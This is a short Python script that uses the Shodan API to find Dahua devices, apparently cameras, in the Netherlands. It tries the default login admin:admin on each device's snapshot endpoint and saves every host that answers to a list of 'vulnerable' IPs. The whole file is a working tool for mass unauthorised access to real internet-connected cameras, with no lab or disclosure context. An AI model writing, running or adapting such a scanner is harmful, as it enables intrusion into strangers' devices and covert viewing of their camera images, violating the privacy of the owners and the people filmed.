import requests
import shodan
from pymongo import MongoClient
from secrets import *

api = shodan.Shodan(SHODAN_API_KEY)
client = MongoClient(mongodb_key)
db = client.addresses

iplist = []
vulnlist = []


# Gets available Dahua Hosts in given country
def getaddresses(amount):
    limit = amount
    counter = 0
    for banner in api.search_cursor('Dahua country:NL'):
        ip = str(banner['ip_str'])
        print(ip)
        # city = str(banner['location'])
        iplist.append(ip)
        counter += 1
        if counter >= limit:
            break
    return iplist


# Generates link to which the request is sent, asking for a snapshot of first available channel using standard login
# credentials.
def linkbuilder(iplist):
    linklist = []
    for ip in iplist:
        link = 'http://admin:admin@' + ip + '/cgi-bin/snapshot.cgi'
        linklist.append(str(link))
    return linklist


# Makes request call to Dahua Product API, asking for a snapshot of first channel available
# If request is succesfull (HTML code 200), True is returned for vulnerable with standard login credentials.
def request(link):
    try:
        response = requests.get(link, verify=False, timeout=3)
        if response.status_code == 200:
            # vulnlist.append(iplist[linklist.index(link)])
            return True
    except:
        return False
        pass


def run(amount):
    getaddresses(amount)
    for ip in iplist:
        link = 'http://admin:admin@' + ip + '/cgi-bin/snapshot.cgi'
        print("trying: " + link)
        if request(link):
            print('Succes!')
            vulnlist.append(ip)
        else:
            print("Fail!")
    print("Vulnerable IP's:")
    return vulnlist


def save():
    with open('./list.txt', 'w') as filehandle:
        for vuln in vulnlist:
            print('writing to file')
            filehandle.write('%s\n' % vuln)


print(run(150))
print(save())
